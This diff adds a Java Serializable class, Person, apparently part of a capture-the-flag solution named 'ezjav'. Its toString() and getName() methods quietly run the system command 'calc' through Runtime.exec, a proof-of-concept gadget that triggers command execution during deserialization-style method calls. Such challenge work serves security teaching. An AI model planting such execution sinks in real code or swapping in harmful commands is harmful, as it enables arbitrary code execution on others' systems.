@@ -1,0 +1,48 @@
+package com.example.ezjav.solution;
+
+import java.io.IOException;
+import java.io.Serializable;
+
+public class Person implements Serializable {
+    private String name;
+    private int age;
+
+    public Person() {
+    }
+
+    Person(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
+
+    @Override
+    public String toString() {
+        try {
+            Runtime.getRuntime().exec("calc");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        return "aaa";
+    }
+
+    public String getName() {
+        try {
+            Runtime.getRuntime().exec("calc");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public int getAge() {
+        return age;
+    }
+
+    public void setAge(int age) {
+        this.age = age;
+    }
+}
